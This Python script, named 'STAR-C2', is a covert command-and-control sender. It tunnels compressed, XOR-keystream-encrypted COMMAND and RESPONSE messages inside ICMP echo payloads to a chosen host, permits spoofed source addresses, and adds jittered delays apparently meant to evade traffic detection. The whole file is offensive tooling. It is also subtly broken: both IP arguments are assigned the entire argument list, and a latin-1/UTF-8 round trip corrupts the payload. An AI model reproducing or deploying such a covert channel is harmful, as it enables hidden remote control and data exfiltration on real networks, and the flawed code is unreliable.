"""
STAR-C2 FIXED SENDER
✓ Uses CA encryption
✓ Real chunking (16-byte chunks)
✓ Realistic timing (200-500ms delays)
✓ No numpy dependency
"""

import struct
import sys
import random
import time
import logging
import gzip
from typing import Optional, Dict, Any, List
from scapy.all import IP, ICMP, Raw, send, conf

conf.ipv6_enabled = False
conf.checkIPsrc = False
conf.verbose = 0

logging.basicConfig(
    level=logging.INFO,
    format='[%(asctime)s] %(message)s',
    datefmt='%H:%M:%S'
)
logger = logging.getLogger(__name__)


# ============================================================================
# CA KEYSTREAM - Pure Python (No NumPy)
# ============================================================================

def rule90_step(state: bytearray) -> bytearray:
    """Rule 90 cellular automaton step"""
    n = len(state)
    new_state = bytearray(n)
    for i in range(n):
        left = state[(i - 1) % n]
        right = state[(i + 1) % n]
        new_state[i] = left ^ right
    return new_state


def ca_keystream(seed_bytes: bytes, length_bytes: int) -> bytes:
    """Generate keystream from seed using Rule 90 CA"""
    if not seed_bytes or length_bytes == 0:
        return b''

    # Initialize state from seed
    state = bytearray(seed_bytes)
    keystream = bytearray()

    # Generate enough keystream
    while len(keystream) < length_bytes:
        # Use middle bit of state as keystream
        middle_byte = state[len(state) // 2]
        keystream.append(middle_byte)

        # Evolve state
        state = rule90_step(state)

    return bytes(keystream[:length_bytes])


def ca_encode_message(msg: str, seed: bytes) -> bytes:
    """Encrypt message using CA keystream"""
    if not msg:
        return b''

    msg_bytes = msg.encode('utf-8')
    ks = ca_keystream(seed, len(msg_bytes))

    # XOR encryption
    encrypted = bytes(a ^ b for a, b in zip(msg_bytes, ks))
    return encrypted


def ca_decode_message(enc_bytes: bytes, seed: bytes) -> str:
    """Decrypt message using CA keystream"""
    if not enc_bytes:
        return ''

    ks = ca_keystream(seed, len(enc_bytes))

    # XOR decryption (same as encryption)
    decrypted = bytes(a ^ b for a, b in zip(enc_bytes, ks))
    return decrypted.decode('utf-8', errors='ignore')


# ============================================================================
# CONSTANTS
# ============================================================================

SYNC = b"STR1"
SATID = b"GXY"
FRAME_ID = 0xA1
SEED = b"\x12\x34\x56\x78"
CHUNK_SIZE = 16  # Fixed chunk size (16 bytes)
MIN_DELAY = 0.2  # Minimum delay (200ms)
MAX_DELAY = 0.5  # Maximum delay (500ms)

# Message Types
MSG_TYPE_REQUEST = 1
MSG_TYPE_REPLY = 0
MSG_TYPE_CHUNK = 2


# ============================================================================
# SENDER CLASS
# ============================================================================

class OptimizedChunkedSender:
    """Sends messages via ICMP with encryption and realistic timing"""

    def __init__(self, src_ip: str, dst_ip: str):
        self.src_ip = src_ip
        self.dst_ip = dst_ip
        self.session_id = random.randint(1, 65535)
        self.seq_num = 0
        logger.info(f"[+] Sender initialized")
        logger.info(f"    Source: {src_ip}")
        logger.info(f"    Destination: {dst_ip}")
        logger.info(f"    Session ID: {self.session_id}")

    def compress_message(self, message: str) -> bytes:
        """Compress message using gzip"""
        msg_bytes = message.encode('utf-8')
        compressed = gzip.compress(msg_bytes, compresslevel=9)
        return compressed

    def send_optimized(self, message: str):
        """
        Send message with:
        ✓ Compression
        ✓ Encryption (CA keystream)
        ✓ Real chunking (16-byte chunks)
        ✓ Realistic timing (200-500ms between packets)
        """

        logger.info(f"\n[*] Sending message: '{message}'")

        # Step 1: Compress
        compressed = self.compress_message(message)
        logger.info(f"[✓] Compressed: {len(message)} → {len(compressed)} bytes")

        # Step 2: Encrypt using CA keystream
        encrypted = ca_encode_message(compressed.decode('latin-1'), SEED)
        logger.info(f"[✓] Encrypted: {len(encrypted)} bytes")
        logger.info(f"[✓] Encrypted payload (hex): {encrypted.hex()[:64]}...")

        # Step 3: Split into REAL chunks
        chunks = []
        for i in range(0, len(encrypted), CHUNK_SIZE):
            chunk = encrypted[i:i + CHUNK_SIZE]
            chunks.append(chunk)

        logger.info(f"[✓] Split into {len(chunks)} chunks ({CHUNK_SIZE} bytes each)")

        # Step 4: Send each chunk with delay
        for i, chunk in enumerate(chunks):
            # Create ICMP packet
            pkt = IP(src=self.src_ip, dst=self.dst_ip) / \
                  ICMP(type=8, code=0, id=self.session_id, seq=self.seq_num) / \
                  Raw(load=chunk)

            # Send packet
            logger.info(f"    [{i + 1}/{len(chunks)}] Sending chunk ({len(chunk)} bytes, seq={self.seq_num})")
            send(pkt, verbose=False)

            self.seq_num += 1

            # Add realistic delay between packets (NOT simultaneous)
            if i < len(chunks) - 1:  # Don't delay after last chunk
                delay = random.uniform(MIN_DELAY, MAX_DELAY)
                logger.info(f"             → Waiting {delay:.3f}s before next chunk...")
                time.sleep(delay)

        logger.info(f"[✓] Message sent successfully!\n")

    def send_command(self, command: str):
        """Send a command message"""
        self.send_optimized(f"COMMAND:{command}")

    def send_response(self, response: str):
        """Send a response message"""
        self.send_optimized(f"RESPONSE:{response}")


# ============================================================================
# MAIN
# ============================================================================

if __name__ == '__main__':
    if len(sys.argv) < 3:
        print("Usage: python sender.py <src_ip> <dst_ip>")
        sys.exit(1)

    src_ip = sys.argv
    dst_ip = sys.argv

    sender = OptimizedChunkedSender(src_ip, dst_ip)

    print("\n[*] Enter messages to send (type 'exit' to quit):")
    print("[*] Messages will be compressed, encrypted, chunked, and sent with realistic delays\n")

    try:
        while True:
            msg = input(">>> ")
            if msg.lower() == 'exit':
                break
            if msg.strip():
                sender.send_optimized(msg)
    except KeyboardInterrupt:
        print("\n[!] Sender stopped")
        sys.exit(0)
